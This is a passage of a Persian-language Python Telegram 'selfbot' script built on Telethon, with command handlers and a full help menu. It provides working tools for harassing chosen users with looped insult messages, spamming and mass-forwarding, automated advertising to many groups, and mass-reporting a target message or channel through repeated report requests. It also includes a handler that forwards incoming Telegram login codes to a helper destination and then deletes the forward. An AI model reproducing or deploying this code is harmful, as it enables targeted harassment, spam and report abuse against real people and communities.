        return
    reply_to = event.message.reply_to.reply_to_msg_id if event.message.reply_to else None
    _cancel(st.attack_task)
    st.attack_active = True
    st.attack_task = asyncio.create_task(_attack_loop(event.chat_id, reply_to))
    await safe_reply(event, f'⚔️ اتک شروع شد! بازه: {st.attack_interval}s')


@client.on(events.NewMessage(outgoing=True, pattern=r'^stopatk$'))
async def cmd_stopatk(event):
    if not is_admin(event.sender_id): return
    st.attack_active = False
    _cancel(st.attack_task)
    await safe_reply(event, '⏹️ اتک متوقف شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^setatktime (\d+)$'))
async def cmd_setatktime(event):
    if not is_admin(event.sender_id): return
    st.attack_interval = max(0, int(event.pattern_match.group(1)))
    st.save()
    await safe_reply(event, f'⏱️ بازه اتک: {st.attack_interval}s')


@client.on(events.NewMessage(outgoing=True, pattern=r'^addatk(?:\s+(.+))?$'))
async def cmd_addatk(event):
    if not is_admin(event.sender_id): return
    if event.is_reply:
        uid = (await event.get_reply_message()).sender_id
        st.attack_targets.add(uid)
        st.save()
        await safe_reply(event, f'🎯 `{uid}` به لیست اتک اضافه شد.')
        return
    inp = event.pattern_match.group(1)
    if inp:
        uid = await resolve_entity(inp.strip())
        if uid:
            st.attack_targets.add(uid)
            st.save()
            await safe_reply(event, f'🎯 `{uid}` اضافه شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanatk$'))
async def cmd_cleanatk(event):
    if not is_admin(event.sender_id): return
    n = len(st.attack_targets)
    st.attack_targets.clear()
    st.save()
    await safe_reply(event, f'🗑️ {n} هدف از لیست اتک حذف شد.')


# ═══════════════════════════════════════════════════════════════
#                  📢 تبلیغات خودکار
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^addads\s+([\s\S]+)'))
async def cmd_addads(event):
    if not is_admin(event.sender_id): return
    raw = event.pattern_match.group(1).strip()
    triple = re.match(r'"""([\s\S]*?)"""', raw)
    msg = triple.group(1).strip() if triple else raw
    st.ads_messages.append(msg)
    st.save()
    await safe_reply(event, f'📢 پیام تبلیغاتی اضافه شد. جمع: {len(st.ads_messages)}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanads$'))
async def cmd_cleanads(event):
    if not is_admin(event.sender_id): return
    n = len(st.ads_messages)
    st.ads_messages.clear()
    st.save()
    await safe_reply(event, f'🗑️ {n} پیام تبلیغاتی حذف شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^addadstarget(?:\s+(.+))?$'))
async def cmd_addadstarget(event):
    if not is_admin(event.sender_id): return
    inp = event.pattern_match.group(1)
    targets = []
    if inp:
        for part in inp.split():
            r = await resolve_entity(part.strip())
            if r: targets.append(str(r))
    else:
        targets.append(str(event.chat_id))

    added = 0
    for t in targets:
        if t not in st.ads_targets:
            st.ads_targets.append(t)
            added += 1
    st.save()
    await safe_reply(event, f'✅ {added} هدف اضافه شد. جمع: {len(st.ads_targets)}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^deladstarget(?:\s+(.+))?$'))
async def cmd_deladstarget(event):
    if not is_admin(event.sender_id): return
    inp = event.pattern_match.group(1)
    if inp:
        r = await resolve_entity(inp.strip())
        key = str(r) if r else inp.strip()
    else:
        key = str(event.chat_id)
    if key in st.ads_targets:
        st.ads_targets.remove(key)
    st.save()
    await safe_reply(event, f'✅ هدف حذف شد. باقی: {len(st.ads_targets)}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanadstarget$'))
async def cmd_cleanadstarget(event):
    if not is_admin(event.sender_id): return
    n = len(st.ads_targets)
    st.ads_targets.clear()
    st.save()
    await safe_reply(event, f'🗑️ {n} هدف تبلیغاتی حذف شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^listads$'))
async def cmd_listads(event):
    if not is_admin(event.sender_id): return
    mode = 'ترتیبی' if st.ads_mode == 'sequential' else 'تصادفی'
    status = '🟢 فعال' if st.ads_active else '🔴 غیرفعال'
    lines = [f'{i}. `{t}`' for i, t in enumerate(st.ads_targets[:15], 1)]
    extra = f'\n... و {len(st.ads_targets)-15} هدف دیگه' if len(st.ads_targets) > 15 else ''
    await safe_reply(event,
        f'📢 **تبلیغات** — {status}\n'
        f'• حالت: {mode}  |  بازه: {st.ads_interval}s\n'
        f'• پیام‌ها: {len(st.ads_messages)}  |  هدف‌ها: {len(st.ads_targets)}\n\n'
        + '\n'.join(lines) + extra
    )


@client.on(events.NewMessage(outgoing=True, pattern=r'^setadstime (\d+)$'))
async def cmd_setadstime(event):
    if not is_admin(event.sender_id): return
    secs = max(60, int(event.pattern_match.group(1)))
    st.ads_interval = secs
    st.save()
    await safe_reply(event, f'⏱️ بازه تبلیغات: {secs}s ({secs//60} دقیقه)')


@client.on(events.NewMessage(outgoing=True, pattern=r'^adsmode (random|sequential)$'))
async def cmd_adsmode(event):
    if not is_admin(event.sender_id): return
    st.ads_mode = event.pattern_match.group(1)
    st.save()
    lbl = 'تصادفی' if st.ads_mode == 'random' else 'ترتیبی'
    await safe_reply(event, f'✅ حالت تبلیغات: {lbl}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^startads$'))
async def cmd_startads(event):
    if not is_admin(event.sender_id): return
    if not st.ads_messages:
        await safe_reply(event, '❗ پیام تبلیغاتی وجود نداره. با `addads` اضافه کن.')
        return
    if not st.ads_targets:
        await safe_reply(event, '❗ هدفی تنظیم نشده. با `addadstarget` اضافه کن.')
        return
    _cancel(st.ads_task)
    st.ads_active = True
    st.ads_task = asyncio.create_task(_ads_loop())
    await safe_reply(event, f'📢 تبلیغات شروع شد!\n• {len(st.ads_targets)} گروه — هر {st.ads_interval}s')


@client.on(events.NewMessage(outgoing=True, pattern=r'^stopads$'))
async def cmd_stopads(event):
    if not is_admin(event.sender_id): return
    st.ads_active = False
    _cancel(st.ads_task)
    await safe_reply(event, '⏹️ تبلیغات متوقف شد.')


# ═══════════════════════════════════════════════════════════════
#                       ریپورت
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r"^report '(\d+)' \[([^\]]+)\] \"([^\"]+)\"$"))
async def cmd_report(event):
    if not is_admin(event.sender_id): return
    count  = int(event.pattern_match.group(1))
    reason = event.pattern_match.group(2).strip()
    link   = event.pattern_match.group(3).strip()

    chat_id, msg_id = await parse_msg_link(link)
    if not chat_id:
        await safe_reply(event, '❌ لینک نامعتبر است.')
        return

    await safe_reply(event, f'⚠️ شروع {count} ریپورت...')
    ok = 0
    for i in range(count):
        try:
            if msg_id:
                await client(ReportRequest(peer=chat_id, id=[msg_id], reason='other', message=reason))
            else:
                await client(ReportSpamRequest(peer=chat_id))
            ok += 1
            if st.report_interval > 0:
                await asyncio.sleep(st.report_interval)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
        except Exception as e:
            logger.warning(f'[ریپورت] {e}')
            break

    await safe_reply(event, f'✅ ریپورت: {ok}/{count} موفق')


@client.on(events.NewMessage(outgoing=True, pattern=r'^setreptime (\d+)$'))
async def cmd_setreptime(event):
    if not is_admin(event.sender_id): return
    st.report_interval = max(0, int(event.pattern_match.group(1)))
    st.save()
    await safe_reply(event, f'⏱️ بازه ریپورت: {st.report_interval}s')


# ═══════════════════════════════════════════════════════════════
#                       تایمر
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^settimer(?:\s+(.+))?$'))
async def cmd_settimer(event):
    if not is_admin(event.sender_id): return
    _cancel(st.timer_task)
    arg = event.pattern_match.group(1)

    if arg:
        chat_id, msg_id = await parse_msg_link(arg.strip())
        if not chat_id:
            await safe_reply(event, '❌ لینک نامعتبر.')
            return
    elif event.is_reply:
        rep = await event.get_reply_message()
        chat_id, msg_id = event.chat_id, rep.id
    else:
        await safe_reply(event, '❗ لینک یا ریپلای لازمه.\nمثال: `settimer https://t.me/ch/123`')
        return

    st.active_timer = (chat_id, msg_id)
    st.timer_task = asyncio.create_task(_timer_loop(chat_id, msg_id))
    await safe_reply(event, '⏱️ تایمر تنظیم شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^stoptimer$'))
async def cmd_stoptimer(event):
    if not is_admin(event.sender_id): return
    if st.active_timer:
        st.active_timer = None
        _cancel(st.timer_task)
        await safe_reply(event, '⏹️ تایمر متوقف شد.')
    else:
        await safe_reply(event, '❗ تایمر فعالی وجود نداره.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^timerstatus$'))
async def cmd_timerstatus(event):
    if not is_admin(event.sender_id): return
    if st.active_timer:
        cid, mid = st.active_timer
        await safe_reply(event, f'⏱️ فعال — چت: `{cid}` پیام: `{mid}`')
    else:
        await safe_reply(event, '❗ تایمر فعالی نیست.')


# ═══════════════════════════════════════════════════════════════
#                     ضد لاگین
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^antilogin (on|off)$'))
async def cmd_antilogin(event):
    if not is_admin(event.sender_id): return
    on = event.pattern_match.group(1) == 'on'
    st.anti_login_enabled = on
    if on:
        if not st.anti_login_task or st.anti_login_task.done():
            st.anti_login_task = asyncio.create_task(_anti_login_loop())
        await safe_reply(event, '🛡️ ضد لاگین فعال شد.')
    else:
        _cancel(st.anti_login_task)
        await safe_reply(event, '🔓 ضد لاگین غیرفعال شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^allowcurrent$'))
async def cmd_allowcurrent(event):
    if not is_admin(event.sender_id): return
    try:
        auths = await client(GetAuthorizationsRequest())
        for a in auths.authorizations:
            st.allowed_sessions.add(a.hash)
        st.save()
        await safe_reply(event, f'✅ {len(auths.authorizations)} سشن فعلی مجاز شدند.')
    except Exception as e:
        await safe_reply(event, f'❌ خطا: {e}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^alogin (on|off)$'))
async def cmd_alogin(event):
    if not is_admin(event.sender_id): return
    st.alogin_enabled = event.pattern_match.group(1) == 'on'
    st.save()
    await safe_reply(event, f'🔔 فوروارد کد لاگین: {"✅ فعال" if st.alogin_enabled else "❌ غیرفعال"}')


@client.on(events.NewMessage(chats=777000))
async def handle_login_code(event):
    """فوروارد کد ورود تلگرام به ربات کمکی"""
    if not st.alogin_enabled:
        return
    try:
        fwd = await client.forward_messages(st.destination, event.message)
        await asyncio.sleep(5)
        await client.delete_messages(st.destination, fwd.id)
    except Exception as e:
        logger.warning(f'[alogin] {e}')


# ═══════════════════════════════════════════════════════════════
#                      ZMN
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^setzmn (\d+)$'))
async def cmd_setzmn(event):
    if not is_admin(event.sender_id): return
    st.zmn_interval = max(0, int(event.pattern_match.group(1)))
    st.save()
    await safe_reply(event, f'⏱️ ZMN: {st.zmn_interval}s')


@client.on(events.NewMessage(outgoing=True, pattern=r'^zmnenemy (on|off)$'))
async def cmd_zmnenemy(event):
    if not is_admin(event.sender_id): return
    st.zmn_enabled = event.pattern_match.group(1) == 'on'
    st.save()
    await safe_reply(event, f'⏳ ZMN: {"✅ فعال" if st.zmn_enabled else "❌ غیرفعال"}')


# ═══════════════════════════════════════════════════════════════
#                    مدیریت ادمین
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^setadmin(?:\s+(\d+))?$'))
async def cmd_setadmin(event):
    if not is_owner(event.sender_id): return
    uid = None
    if event.is_reply:
        uid = (await event.get_reply_message()).sender_id
    elif event.pattern_match.group(1):
        uid = int(event.pattern_match.group(1))
    if uid:
        st.admins.add(uid)
        st.save()
        await safe_reply(event, f'👑 `{uid}` ادمین شد.')
    else:
        await safe_reply(event, '❗ آیدی یا ریپلای لازمه.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^deladmin(?:\s+(\d+))?$'))
async def cmd_deladmin(event):
    if not is_owner(event.sender_id): return
    uid = None
    if event.is_reply:
        uid = (await event.get_reply_message()).sender_id
    elif event.pattern_match.group(1):
        uid = int(event.pattern_match.group(1))
    if uid and uid != OWNER_ID:
        st.admins.discard(uid)
        st.save()
        await safe_reply(event, f'✅ ادمین `{uid}` حذف شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^cleanadmins$'))
async def cmd_cleanadmins(event):
    if not is_owner(event.sender_id): return
    st.admins.clear()
    st.admins.add(OWNER_ID)
    st.save()
    await safe_reply(event, '🗑️ لیست ادمین‌ها پاک شد (فقط اونر باقی ماند).')


@client.on(events.NewMessage(outgoing=True, pattern=r'^adminlist$'))
async def cmd_adminlist(event):
    if not is_owner(event.sender_id): return
    lines = [f'• `{u}`{"  👑 اونر" if u==OWNER_ID else ""}' for u in st.admins]
    await safe_reply(event, '**ادمین‌ها:**\n' + '\n'.join(lines))


# ═══════════════════════════════════════════════════════════════
#                    join / leave
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^join\s+(.+)$'))
async def cmd_join(event):
    if not is_admin(event.sender_id): return
    link = event.pattern_match.group(1).strip()
    try:
        h = link.split('+')[-1] if '+' in link else link.split('/')[-1]
        await client(ImportChatInviteRequest(h))
        await safe_reply(event, '✅ جوین شدی.')
    except Exception as e:
        await safe_reply(event, f'❌ {e}')


@client.on(events.NewMessage(outgoing=True, pattern=r'^leave(?:\s+(.+))?$'))
async def cmd_leave(event):
    if not is_admin(event.sender_id): return
    inp = event.pattern_match.group(1)
    cid = await resolve_entity(inp.strip()) if inp else event.chat_id
    if not cid:
        await safe_reply(event, '❌ چت پیدا نشد.')
        return
    try:
        await client(LeaveChannelRequest(cid))
        await safe_reply(event, f'✅ از `{cid}` خارج شدی.')
    except Exception as e:
        await safe_reply(event, f'❌ {e}')


# ═══════════════════════════════════════════════════════════════
#                  ذخیره / ریست
# ═══════════════════════════════════════════════════════════════
@client.on(events.NewMessage(outgoing=True, pattern=r'^save$'))
async def cmd_save(event):
    if not is_admin(event.sender_id): return
    st.save()
    await safe_reply(event, '💾 تنظیمات ذخیره شد.')


@client.on(events.NewMessage(outgoing=True, pattern=r'^reset$'))
async def cmd_reset(event):
    if not is_owner(event.sender_id): return
    st.auto_send = st.auto_reply = st.spam_active = st.attack_active = st.ads_active = False
    st.active_timer = None
    for t in [st.timer_task, st.anti_login_task, st.attack_task, st.ads_task]:
        _cancel(t)
    st.save()
    await safe_reply(event, '🔄 همه عملیات متوقف شدند.')


# ═══════════════════════════════════════════════════════════════
#                  راهنمای کامل فارسی
# ═══════════════════════════════════════════════════════════════
_H = {
'': """
╔══════════════════════════════════════╗
║   🔥 سلف‌بات PRO 3.0 — راهنمای اصلی  ║
╚══════════════════════════════════════╝

`help1` — ربات، ادمین، میوت، join/leave
`help2` — 📢 تبلیغات خودکار
`help3` — ⚔️ اتکر و اسپم
`help4` — 💀 دشمنان و پاسخ خودکار
`help5` — ⚠️ ریپورت
`help6` — 🛡️ ضد لاگین
`help7` — ⏱️ تایمر و تنظیمات عمومی

`status` — وضعیت کلی
`save`   — ذخیره تنظیمات
`stop`   — توقف همه عملیات
""",

'1': """
╔═══════════════════════════════╗
║   📊 مدیریت ربات — help1      ║
╚═══════════════════════════════╝

**🤖 کنترل:**
`bot on/off` — روشن/خاموش این چت
`bot all on/off` — سراسری
`stop` — توقف همه عملیات
`save` — ذخیره دستی
`reset` — ریست کامل (اونر)

**👑 ادمین (اونر):**
`setadmin [ID/ریپلای]`
`deladmin [ID/ریپلای]`
`cleanadmins` / `adminlist`

**🆔 اطلاعات:**
`id` — آیدی خودت یا ریپلای‌شده
`gpid` — آیدی چت جاری

**🔇 میوت:**
`mutepv on/off` — میوت همه پیوی‌ها
`mute on/off` — میوت چت جاری

**🔤 پریفیکس:**
`setalamat [علامت]` — مثلاً `.`
`delalamat [علامت]`

**🚪 ورود/خروج:**
`join [لینک]`
`leave [لینک اختیاری]`
""",

'2': """
╔══════════════════════════════════╗
║   📢 تبلیغات خودکار — help2     ║
╚══════════════════════════════════╝

**📝 پیام‌های تبلیغاتی:**
`addads [متن]`
`addads """متن چندخطی"""`
`cleanads` — حذف همه

**🎯 گروه‌های هدف:**
`addadstarget` — چت جاری
`addadstarget [ID/یوزرنیم]`
`deladstarget` — حذف چت جاری
`cleanadstarget` — حذف همه
`listads` — وضعیت کامل

**⚙️ تنظیمات:**
`setadstime [ثانیه]` — حداقل 60s
`adsmode random` — تصادفی
`adsmode sequential` — ترتیبی

**▶️ کنترل:**
`startads` — شروع
`stopads` — توقف

**مثال:**
`addads 🛍 محصولات ما رو ببینید!`
`addadstarget -1001234567890`
`setadstime 600`
`startads`
""",

'3': """
╔══════════════════════════════════╗
║   ⚔️ اتکر و اسپم — help3        ║
╚══════════════════════════════════╝

**⚔️ اتکر خودکار:**
`attack` — شروع در چت جاری
`stopatk` — توقف
`setatktime [ثانیه]` — بازه اتک
`addatk [ID/ریپلای]` — افزودن هدف
`cleanatk` — پاک کردن هدف‌ها

**💬 اسپم:**
`spam [تعداد] [متن]` — اسپم متن خاص
`spam [تعداد]` + ریپلای — اسپم پیام
`!spam` + ریپلای — فوروارد ۵۰ باره
`spstop` — توقف اسپم
`stimer [ثانیه]` — تأخیر بین اسپم‌ها

**📝 پیام‌های اتک:**
`addfosh [متن]`
`addfosh """متن چندخطی"""`
`addlistfosh` — از فایل .txt (ریپلای)
`delfosh [متن]` / `cleanfosh`
`listfosh` — نمایش لیست

**🏷️ منشن در اتک:**
`tag on/off` — فعال/غیرفعال
`setemoji [ایموجی]` — ایموجی منشن
""",

'4': """
╔════════════════════════════════════╗
║   💀 دشمنان و پاسخ خودکار — help4  ║
╚════════════════════════════════════╝

**🎯 لیست منشن (setid):**
`setid [ID/یوزرنیم/ریپلای]`
`delid [ID/یوزرنیم/ریپلای]`
`cleanid` / `listid`

**🔒 پاسخ خودکار (setenemy):**
`setenemy [ID/ریپلای]` — قفل
`delenemy [ID/ریپلای]` — باز کردن
`cleanenemy` — پاک کردن همه

**⏳ ZMN (تأخیر بین پاسخ‌ها):**
`setzmn [ثانیه]` — حداقل فاصله
`zmnenemy on/off` — فعال/غیرفعال

**▶️ منشن خودکار:**
`start` — منشن در چت جاری
`start [ID/لینک]` — چت خاص
`stop` — توقف

**🔄 پاسخ به ریپلای:**
`setrep` (ریپلای روی پیام)

**⏱️ بازه ارسال:**
`settime [ثانیه]` — کلی
`settime [ثانیه] [ID چت]` — خاص
""",

'5': """
╔════════════════════════════════╗
║   ⚠️ سیستم ریپورت — help5     ║
╚════════════════════════════════╝

**فرمت دستور:**
`report '[تعداد]' [دلیل] "[لینک]"`

**مثال:**
`report '5' [اسپم] "https://t.me/ch/123"`

**توضیح:**
• `[تعداد]` — تعداد ریپورت
• `[دلیل]` — متن داخل کروشه
• `"[لینک]"` — لینک پیام یا کانال

اگه لینک → پیام خاص: ریپورت روی همون پیام
اگه لینک → کانال/گروه: ریپورت اسپم

**بازه:**
`setreptime [ثانیه]` — فاصله بین ریپورت‌ها
""",

'6': """
╔════════════════════════════════╗
║   🛡️ ضد لاگین — help6         ║
╚════════════════════════════════╝

**⚠️ مراحل صحیح:**
1️⃣ `allowcurrent` — مجاز کردن سشن‌های فعلی
2️⃣ `antilogin on` — فعال‌سازی

`antilogin off` — غیرفعال

**📱 فوروارد کد ورود:**
`alogin on/off` — فوروارد کد به ربات کمکی

**⚙️ چطور کار می‌کنه:**
• هر ۵ ثانیه سشن‌ها چک می‌شن
• سشن‌های جدید (غیر از مجازها) حذف می‌شن
• سشن‌های مجاز هرگز لمس نمی‌شن
""",

'7': """
╔═══════════════════════════════════╗
║   ⏱️ تایمر و تنظیمات — help7    ║
╚═══════════════════════════════════╝

**⏱️ تایمر زنده ایران:**
`settimer [لینک]` — از لینک پیام
`settimer` + ریپلای — از پیام ریپلای‌شده
`stoptimer` — توقف
`timerstatus` — وضعیت

**📊 تنظیمات زمان:**
`settime [s]` — بازه منشن/پاسخ کلی
`stimer [s]` — تأخیر اسپم
`setatktime [s]` — بازه اتک
`setzmn [s]` — تأخیر ZMN
`setreptime [s]` — تأخیر ریپورت
`setadstime [s]` — بازه تبلیغات (min: 60)

**🎨 ظاهر:**
`setemoji [ایموجی]` — ایموجی منشن
`tag on/off` — نمایش منشن در start

**💾 ذخیره‌سازی:**
تنظیمات به صورت خودکار در `selfbot_config.json` ذخیره می‌شن.
`save` — ذخیره دستی
""",
}

@client.on(events.NewMessage(outgoing=True, pattern=r'^help(\d?)$'))
async def cmd_help(event):
    if not is_admin(event.sender_id): return
    key = event.pattern_match.group(1)
    await safe_reply(event, _H.get(key, _H['']), parse_mode='md')


# ═══════════════════════════════════════════════════════════════
#                شروع و اجرای برنامه
# ═══════════════════════════════════════════════════════════════
async def startup():
    st.load()
    await client.start(phone=PHONE_NUMBER)
    me = await client.get_me()
    print(
        '\n╔══════════════════════════════════════════════╗\n'
        '║   🔥 سلف‌بات PRO 3.0 — راه‌اندازی شد!       ║\n'
        '╠══════════════════════════════════════════════╣\n'
        f'║  👤 {me.first_name}  (@{me.username or "N/A"})  🆔 {me.id}\n'
        f'║  📝 پیام‌ها: {len(st.messages)}  💀 دشمنان: {len(st.mention_targets)}\n'
        f'║  📢 هدف تبلیغ: {len(st.ads_targets)} گروه\n'
        '╠══════════════════════════════════════════════╣\n'
        '║  💡 برای راهنما بنویس: help                  ║\n'
        '╚══════════════════════════════════════════════╝\n'
    )
    await client.run_until_disconnected()


async def shutdown():
    st.save()
    for t in [st.timer_task, st.anti_login_task, st.attack_task, st.ads_task]:
        _cancel(t)
    await client.disconnect()
    print('\n🚪 سلف‌بات با موفقیت خاموش شد.')


if __name__ == '__main__':
    try:
        with client:
            client.loop.run_until_complete(startup())
    except KeyboardInterrupt:
        client.loop.run_until_complete(shutdown())
    except Exception as e:
        logger.critical(f'خطای بحرانی: {e}')
        raise
